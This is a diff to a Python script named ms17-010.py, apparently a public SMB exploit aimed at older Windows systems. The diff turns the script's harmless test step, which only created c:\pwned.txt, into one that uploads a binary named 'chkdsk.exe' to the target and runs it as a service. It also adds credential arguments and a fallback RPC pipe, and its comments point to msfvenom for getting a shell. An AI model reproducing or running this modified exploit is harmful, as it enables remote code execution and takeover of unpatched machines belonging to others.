--- ms17-010.py	2018-06-11 19:46:25.000000000 -0700
+++ ms17-010.py.new	2018-06-11 19:10:42.000000000 -0700
@@ -30,7 +30,7 @@
 - Windows XP SP3 x86
 - Windows 2000 SP4 x86
 '''
-
+# See the end of the script for how to enter these on the command line.
 USERNAME = ''
 PASSWORD = ''
 
@@ -790,7 +790,8 @@
 	conn.get_socket().setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
 
 	info = {}
-
+	if USERNAME != "":
+		print("Connecting with user '" + USERNAME + "' and password '" + PASSWORD + "'")
 	conn.login(USERNAME, PASSWORD, maxBufferSize=4356)
 	server_os = conn.get_server_os()
 	print('Target OS: '+server_os)
@@ -911,14 +912,14 @@
 def smb_pwn(conn, arch):
 	smbConn = conn.get_smbconnection()
 	
-	print('creating file c:\\pwned.txt on the target')
-	tid2 = smbConn.connectTree('C$')
-	fid2 = smbConn.createFile(tid2, '/pwned.txt')
-	smbConn.closeFile(tid2, fid2)
-	smbConn.disconnectTree(tid2)
+	print('Attempting to upload and execute the payload')
+	#tid2 = smbConn.connectTree('C$')
+	#fid2 = smbConn.createFile(tid2, '/pwned.txt')
+	#smbConn.closeFile(tid2, fid2)
+	#smbConn.disconnectTree(tid2)
 	
-	#smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
-	#service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')
+	smb_send_file(smbConn, 'chkdsk.exe', 'C', '/chkdsk.exe')
+	service_exec(conn, r'cmd /c c:\chkdsk.exe')
 	# Note: there are many methods to get shell over SMB admin session
 	# a simple method to get shell (but easily to be detected by AV) is
 	# executing binary generated by "msfvenom -f exe-service ..."
@@ -937,9 +938,17 @@
 	service_name = ''.join([random.choice(string.letters) for i in range(4)])
 
 	# Setup up a DCE SMBTransport with the connection already in place
-	rpcsvc = conn.get_dce_rpc('svcctl')
-	rpcsvc.connect()
-	rpcsvc.bind(scmr.MSRPC_UUID_SCMR)
+	try:
+		print("Trying dce_rpc('browser')")
+		rpcsvc = conn.get_dce_rpc('browser')
+		rpcsvc.connect()
+		rpcsvc.bind(scmr.MSRPC_UUID_SCMR)
+	except:
+		print("Trying dce_rpc('svcctl')")
+		rpcsvc = conn.get_dce_rpc('svcctl')
+		rpcsvc.connect()
+		rpcsvc.bind(scmr.MSRPC_UUID_SCMR)
+
 	svcHandle = None
 	try:
 		print("Opening SVCManager on %s....." % conn.get_remote_host())
@@ -987,11 +996,23 @@
 
 
 if len(sys.argv) < 2:
-	print("{} <ip> [pipe_name]".format(sys.argv[0]))
+	print("{} <ip> [pipe_name] [USERNAME] [PASSWORD]".format(sys.argv[0]))
 	sys.exit(1)
-
 target = sys.argv[1]
 pipe_name = None if len(sys.argv) < 3 else sys.argv[2]
+if pipe_name == 'None':
+	pipe_name = None
+if len(sys.argv) >= 4:
+	USERNAME = sys.argv[3]
+	if len(sys.argv) > 4:
+		PASSWORD = sys.argv[4]
+# If you don't provide a pipe name or if you provide the text "None" on
+# the command line for pipe_name then the script will try to discover
+# a usable pipe name and use it.
+# USERNAME and PASSWORD are also optional parameters. If you provide
+# a USERNAME and PASSWORD the script will try to make an authenticated
+# connection. Use single quotes around the password or otherwise escape 
+# special characters in the password entered on the command line.
 
 exploit(target, pipe_name)
-print('Done')
\ No newline at end of file
+print('Done')
